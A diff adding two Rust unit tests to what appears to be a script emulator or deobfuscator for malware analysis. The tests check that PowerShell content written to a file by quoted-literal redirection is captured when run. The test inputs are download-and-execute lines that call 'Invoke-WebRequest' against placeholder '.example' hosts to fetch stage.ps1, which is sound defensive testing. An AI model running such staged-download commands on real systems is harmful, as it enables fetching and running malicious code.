@@ -13636,6 +13636,42 @@ echo %PAYLOAD% | %RUN%"#,
     }
 
     #[test]
+    fn powershell_quoted_literal_redirect_preserves_script_content() {
+        let mut env = Environment::new(&Config::default());
+        let ps1 = b"Invoke-WebRequest https://ps-literal-redirect.example/stage.ps1".to_vec();
+
+        interpret_line(
+            r#"powershell -Command "'Invoke-WebRequest https://ps-literal-redirect.example/stage.ps1' > C:\Temp\stage.ps1""#,
+            &mut env,
+        );
+        interpret_line(r#"powershell -NoProfile -File C:\Temp\stage.ps1"#, &mut env);
+
+        assert!(
+            env.exec_ps1.iter().any(|payload| payload == &ps1),
+            "PowerShell quoted literal redirection script content was not queued: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
+    fn powershell_quoted_literal_redirect_uses_final_redirection_operator() {
+        let mut env = Environment::new(&Config::default());
+        let ps1 = b"Write-Output 1 > 0; Invoke-WebRequest https://ps-literal-final-redirect.example/stage.ps1".to_vec();
+
+        interpret_line(
+            r#"powershell -Command "'Write-Output 1 > 0; Invoke-WebRequest https://ps-literal-final-redirect.example/stage.ps1' > C:\Temp\stage.ps1""#,
+            &mut env,
+        );
+        interpret_line(r#"powershell -NoProfile -File C:\Temp\stage.ps1"#, &mut env);
+
+        assert!(
+            env.exec_ps1.iter().any(|payload| payload == &ps1),
+            "PowerShell quoted literal redirection split on an inner >: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
     fn powershell_set_content_value_preserves_script_content() {
         let mut env = Environment::new(&Config::default());
         let ps1 = b"Invoke-WebRequest https://ps-set-content-value.example/stage.ps1".to_vec();
